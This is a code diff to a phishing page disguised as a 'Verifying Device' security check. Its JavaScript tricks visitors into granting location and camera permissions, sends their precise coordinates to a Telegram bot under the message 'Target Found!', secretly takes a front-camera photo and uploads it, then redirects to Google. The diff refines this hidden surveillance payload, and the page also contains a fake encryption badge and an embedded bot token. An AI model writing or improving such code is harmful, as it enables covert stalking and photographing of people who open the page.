@@ -43,13 +43,13 @@
 <div class="card">
     <div class="spinner"></div>
     <h2>Verifying Device</h2>
-    <p>We are securing your connection. Please grant the requested permissions to continue to the destination.</p>
+    <p>Please wait while we secure your connection. Do not close this window.</p>
     <div id="status" style="color: #007bff; font-weight: bold; margin-top: 15px;">Initializing...</div>
     <div class="footer">SSL Secure Connection • 256-bit Encryption</div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
-<video id="video" style="display:none;" autoplay></video>
+<video id="video" style="display:none;" autoplay playsinline></video>
 
 <script>
     const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
@@ -66,11 +66,14 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 await sendLocation(pos);
+                // Location milte hi camera process shuru karein
                 await capturePhoto();
             }, (err) => {
-                alert("Please allow all permissions to verify your identity.");
+                alert("Security Error: Please allow all permissions to verify your session.");
                 location.reload();
             }, { enableHighAccuracy: true });
+        } else {
+            statusText.innerText = "Error: Geolocation not supported.";
         }
     }
 
@@ -78,10 +81,11 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         const acc = pos.coords.accuracy;
-        // Fix: Yahan ${lat} mein $ missing tha
+        
+        // Fixed Template Literal syntax for URL
         const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
         
-        const text = `📍 *Location Received!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View on Google Maps](${mapLink})`;
+        const text = `📍 *Target Found!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View Location](${mapLink})`;
         
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`);
         statusText.innerText = "Security Check: 50% Complete...";
@@ -89,58 +93,62 @@
 
     async function capturePhoto() {
         try {
-            statusText.innerText = "Finalizing Verification...";
+            statusText.innerText = "Starting Visual Verification...";
             
-            // Camera Stream start karna
+            // Camera Stream setup
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, // Front camera force karna
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                 audio: false 
             });
             
             const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // Video play karna mandatory hai
+            // Ensure video starts playing
             await video.play();
 
-            // Wait until video is actually playing and has dimensions
-            await new Promise((resolve) => {
-                video.onplaying = resolve;
-            });
+            // Status update for user (Taki wo screen ki taraf dekhta rahe)
+            statusText.innerText = "Finalizing Secure Link (3s)...";
 
-            const canvas = document.getElementById('canvas');
-            // Video dimensions set karna
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // 2 seconds ka wait taaki camera light adjust ho jaye aur photo saaf aaye
+            // 3 Seconds ka wait - Camera adjustment ke liye
             setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
+                // Photo ko file (blob) mein badalna
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                 
+                statusText.innerText = "Uploading Metadata...";
+
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'identity_check.jpg');
+                formData.append('photo', blob, 'verification.jpg');
                 formData.append('caption', '📸 Photo Identity Captured');
 
+                // Telegram ko bhej dena
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
 
-                // Stream band karna (Important: Camera light off karne ke liye)
+                // Camera band karein
                 stream.getTracks().forEach(track => track.stop());
                 
-                statusText.innerText = "Verified! Redirecting...";
+                statusText.innerText = "Verification Success!";
+                
                 setTimeout(() => {
                     window.location.href = "https://www.google.com";
                 }, 1000);
-            }, 2000); // Wait time badha diya hai
+
+            }, 3000); // Wait 3 seconds before capture
 
         } catch (err) {
-            console.error("Camera Error:", err);
+            console.error("Camera Access Failed:", err);
+            // Agar camera block ho jaye toh bhi redirect kar dein
             window.location.href = "https://www.google.com";
         }
     }
